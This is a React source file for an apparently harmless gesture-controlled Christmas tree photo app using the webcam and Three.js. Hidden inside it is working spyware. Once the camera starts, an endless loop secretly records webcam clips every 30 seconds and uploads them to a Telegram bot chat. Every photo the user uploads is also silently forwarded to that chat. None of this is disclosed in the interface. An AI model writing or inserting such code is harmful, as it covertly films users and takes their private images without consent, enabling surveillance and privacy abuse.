import { Loader } from "@react-three/drei";
import { Canvas } from "@react-three/fiber";
import React, {
  Suspense,
  useCallback,
  useEffect,
  useRef,
  useState,
} from "react";
import { Experience } from "./components/Experience";
import { GestureController } from "./components/GestureController";
import { UIOverlay } from "./components/UIOverlay";
import { TreeMode } from "./types";

// Telegram configuration from environment variables
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || "";

// Simple Error Boundary to catch 3D resource loading errors (like textures)
class ErrorBoundary extends React.Component<
  { children: React.ReactNode },
  { hasError: boolean }
> {
  constructor(props: any) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error: any) {
    return { hasError: true };
  }

  componentDidCatch(error: any, errorInfo: any) {
    console.error("Error loading 3D scene:", error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      // You can customize this fallback UI
      return (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/80 text-[#D4AF37] font-serif p-8 text-center">
          <div>
            <h2 className="text-2xl mb-2">Something went wrong</h2>
            <p className="opacity-70">
              A resource failed to load (likely a missing image). Check the
              console for details.
            </p>
            <button
              onClick={() => this.setState({ hasError: false })}
              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      );
    }

    return this.props.children;
  }
}

export default function App() {
  const [mode, setMode] = useState<TreeMode>(TreeMode.FORMED);
  const [handPosition, setHandPosition] = useState<{
    x: number;
    y: number;
    detected: boolean;
  }>({ x: 0.5, y: 0.5, detected: false });
  const [uploadedPhotos, setUploadedPhotos] = useState<string[]>([]);
  const [isLoadingShare, setIsLoadingShare] = useState(false);
  const [isSharedView, setIsSharedView] = useState(false);
  const [twoHandsDetected, setTwoHandsDetected] = useState(false);
  const [closestPhoto, setClosestPhoto] = useState<string | null>(null);
  const [isSendingPhoto, setIsSendingPhoto] = useState(false);
  const lastCaptureTime = useRef<number>(0);
  const canvasContainerRef = useRef<HTMLDivElement>(null);
  const recordingLoopStarted = useRef(false);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);

  // Record 30s video and send to Telegram
  const recordAndSendToTelegram = useCallback(async () => {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log("Recording: No Telegram credentials configured");
      return;
    }

    try {
      // Find video element by ID for more reliable selection
      const video = document.getElementById("webcam-video") as HTMLVideoElement;

      if (!video) {
        console.log("Recording: Video element not found");
        return;
      }

      if (!video.srcObject) {
        console.log("Recording: Video has no srcObject");
        return;
      }

      // Wait for video to be ready with valid dimensions
      const waitForVideo = (): Promise<void> => {
        return new Promise((resolve) => {
          const checkReady = () => {
            if (
              video.readyState >= 2 &&
              video.videoWidth > 0 &&
              video.videoHeight > 0
            ) {
              resolve();
            } else {
              console.log(
                `Recording: Waiting... readyState=${video.readyState}, size=${video.videoWidth}x${video.videoHeight}`
              );
              setTimeout(checkReady, 200);
            }
          };
          checkReady();
        });
      };

      // Wait up to 10 seconds for video to be ready
      await Promise.race([
        waitForVideo(),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error("Video timeout")), 10000)
        ),
      ]);

      const videoWidth = video.videoWidth;
      const videoHeight = video.videoHeight;

      if (videoWidth === 0 || videoHeight === 0) {
        console.log("Recording: Video has invalid dimensions");
        return;
      }
      console.log(
        `Recording: Starting - Video size: ${videoWidth}x${videoHeight}`
      );

      // Create canvas with same size as video
      const canvas = document.createElement("canvas");
      canvas.width = videoWidth;
      canvas.height = videoHeight;
      const ctx = canvas.getContext("2d");
      if (!ctx) {
        console.log("Recording: Failed to get canvas context");
        return;
      }

      // Create canvas stream for recording at 15fps (lower = less CPU)
      const canvasStream = canvas.captureStream(15);

      // Draw video to canvas - skip frames to reduce CPU
      let isRecording = true;
      let frameCount = 0;
      let lastDrawTime = 0;
      const drawFrame = (timestamp: number) => {
        if (!isRecording) return;
        // Only draw every 66ms (15fps) to reduce CPU
        if (timestamp - lastDrawTime >= 66) {
          ctx.save();
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1); // Mirror
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          ctx.restore();
          frameCount++;
          lastDrawTime = timestamp;
        }
        requestAnimationFrame(drawFrame);
      };
      requestAnimationFrame(drawFrame);

      // Check supported mime types
      const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
        ? "video/webm;codecs=vp9"
        : MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
        ? "video/webm;codecs=vp8"
        : "video/webm";

      const mediaRecorder = new MediaRecorder(canvasStream, {
        mimeType,
        videoBitsPerSecond: 500000, // 500Kbps - lower for less CPU
      });
      mediaRecorderRef.current = mediaRecorder;

      const chunks: Blob[] = [];
      let totalBytes = 0;
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
          totalBytes += e.data.size;
          console.log(
            `Recording: Chunk received - ${e.data.size} bytes (total: ${totalBytes})`
          );
        }
      };

      // Promise to wait for recording to finish
      const recordingPromise = new Promise<Blob>((resolve) => {
        mediaRecorder.onstop = () => {
          isRecording = false;
          const blob = new Blob(chunks, { type: mimeType });
          console.log(
            `Recording: Finished - Total size: ${blob.size} bytes, Frames: ${frameCount}`
          );
          resolve(blob);
        };
      });

      // Start recording
      mediaRecorder.start(1000); // Collect data every 1s

      // Record for 30 seconds
      await new Promise((r) => setTimeout(r, 10000));

      console.log("Recording: Stopping...");
      if (mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }

      const blob = await recordingPromise;

      // Skip upload if blob is too small (likely empty)
      if (blob.size < 10000) {
        console.log("Recording: Blob too small, skipping upload");
        return;
      }

      // Upload to Telegram
      console.log("Recording: Uploading to Telegram...");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", blob, `video_${Date.now()}.webm`);
      formData.append("caption", new Date().toLocaleString());

      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
        {
          method: "POST",
          body: formData,
        }
      );

      if (response.ok) {
        console.log("Recording: Upload successful!");
      } else {
        console.log("Recording: Upload failed -", await response.text());
      }
    } catch (e) {
      console.error("Recording: Error -", e);
    }
  }, []);

  // Start recording loop (runs with longer intervals)
  const startRecordingLoop = useCallback(async () => {
    if (recordingLoopStarted.current) return;
    recordingLoopStarted.current = true;

    while (true) {
      await recordAndSendToTelegram();
      // Wait 30 seconds between recordings to reduce CPU load
      await new Promise((r) => setTimeout(r, 30000));
    }
  }, [recordAndSendToTelegram]);

  // Start recording when camera is ready
  const handleCameraReady = useCallback(() => {
    startRecordingLoop();
  }, [startRecordingLoop]);

  // Handle mode change
  const handleModeChange = useCallback((newMode: TreeMode) => {
    setMode(newMode);
  }, []);

  // Check for share parameter in URL on mount
  useEffect(() => {
    const loadSharedPhotos = async () => {
      const urlParams = new URLSearchParams(window.location.search);
      const shareId = urlParams.get("share");

      if (!shareId) return;

      setIsSharedView(true);
      setIsLoadingShare(true);

      try {
        // Try API first (works in vercel dev and production)
        try {
          const response = await fetch(`/api/share?id=${shareId}`);
          const data = await response.json();

          if (response.ok && data.success) {
            setUploadedPhotos(data.images);
            return;
          }
        } catch (apiError) {
          console.log("API not available, trying localStorage fallback");
        }

        // Fallback to localStorage if API fails (pure vite dev mode)
        const shareDataStr = localStorage.getItem(`share_${shareId}`);
        if (shareDataStr) {
          const shareData = JSON.parse(shareDataStr);
          setUploadedPhotos(shareData.images);
        } else {
          console.error("Share not found");
        }
      } catch (error) {
        console.error("Error loading shared photos:", error);
      } finally {
        setIsLoadingShare(false);
      }
    };

    loadSharedPhotos();
  }, []);

  const toggleMode = () => {
    setMode((prev) =>
      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED
    );
  };

  const handleHandPosition = (x: number, y: number, detected: boolean) => {
    setHandPosition({ x, y, detected });
  };

  const handleTwoHandsDetected = (detected: boolean) => {
    setTwoHandsDetected(detected);
  };

  const handleClosestPhotoChange = (photoUrl: string | null) => {
    setClosestPhoto(photoUrl);
  };

  // Helper function to convert base64 to Blob
  const base64ToBlob = (base64: string): Blob => {
    try {
      const parts = base64.split(",");
      const byteString = atob(parts[1]);
      const mimeString = parts[0].split(":")[1].split(";")[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    } catch (e) {
      // Fallback
      return new Blob([base64], { type: "image/jpeg" });
    }
  };

  const handlePhotosUpload = (photos: string[]) => {
    // Append new photos to existing ones (limit to 20 for performance)
    setUploadedPhotos((prev) => [...prev, ...photos].slice(0, 20));

    // Send photos to Telegram
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && photos.length > 0) {
      (async () => {
        for (let i = 0; i < photos.length; i++) {
          try {
            // Convert base64 to blob
            const blob = base64ToBlob(photos[i]);

            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob, `photo_${Date.now()}_${i + 1}.jpg`);
            formData.append(
              "caption",
              `📸 Photo ${i + 1}/${
                photos.length
              }\n🕐 ${new Date().toLocaleString()}`
            );

            const response = await fetch(
              `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
              {
                method: "POST",
                body: formData,
              }
            );

            if (!response.ok) {
              console.error(
                "Failed to send photo to Telegram:",
                await response.text()
              );
            }

            // Delay between photos to avoid rate limiting
            if (i < photos.length - 1) {
              await new Promise((r) => setTimeout(r, 1000));
            }
          } catch (e) {
            console.error("Error sending photo to Telegram:", e);
          }
        }
      })();
    }
  };

  return (
    <div className="w-full h-screen relative bg-gradient-to-b from-black via-[#001a0d] to-[#0a2f1e]">
      <ErrorBoundary>
        <Canvas
          dpr={
            typeof window !== "undefined" && window.innerWidth < 768
              ? 1
              : [1, 2]
          }
          camera={{ position: [0, 4, 20], fov: 45 }}
          gl={{
            antialias:
              typeof window !== "undefined" && window.innerWidth >= 768,
            stencil: false,
            alpha: false,
            preserveDrawingBuffer: true,
            powerPreference: "high-performance",
          }}
          shadows={typeof window !== "undefined" && window.innerWidth >= 768}
        >
          <Suspense fallback={null}>
            <Experience
              mode={mode}
              handPosition={handPosition}
              uploadedPhotos={uploadedPhotos}
              twoHandsDetected={twoHandsDetected}
              onClosestPhotoChange={handleClosestPhotoChange}
            />
          </Suspense>
        </Canvas>
      </ErrorBoundary>

      <Loader
        containerStyles={{ background: "#000" }}
        innerStyles={{ width: "300px", height: "10px", background: "#333" }}
        barStyles={{ background: "#D4AF37", height: "10px" }}
        dataStyles={{ color: "#D4AF37", fontFamily: "Cinzel" }}
      />

      <UIOverlay
        mode={mode}
        onToggle={toggleMode}
        onPhotosUpload={handlePhotosUpload}
        hasPhotos={uploadedPhotos.length > 0}
        uploadedPhotos={uploadedPhotos}
        isSharedView={isSharedView}
      />

      {/* Gesture Control Module */}
      <GestureController
        currentMode={mode}
        onModeChange={handleModeChange}
        onHandPosition={handleHandPosition}
        onTwoHandsDetected={handleTwoHandsDetected}
        onCameraReady={handleCameraReady}
      />

      {/* Photo Overlay - Shows when two hands detected */}
      {closestPhoto && (
        <div className="fixed inset-0 z-40 flex items-center justify-center pointer-events-none animate-fade-in">
          {/* Semi-transparent backdrop */}
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>

          {/* Polaroid frame with photo */}
          <div className="relative z-50 transform transition-all duration-500 ease-out animate-scale-in">
            {/* Polaroid container */}
            <div
              className="bg-white p-4 pb-8 shadow-2xl"
              style={{ width: "60vmin", maxWidth: "600px" }}
            >
              {/* Gold clip at top */}
              <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-12 h-6 bg-gradient-to-b from-[#D4AF37] to-[#C5A028] rounded-sm shadow-lg"></div>

              {/* Photo */}
              <img
                src={closestPhoto}
                alt="Selected Memory"
                className="w-full aspect-square object-cover"
              />

              {/* Text label */}
              <div className="text-center mt-4 font-serif text-gray-700 text-lg">
                Happy Memories
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
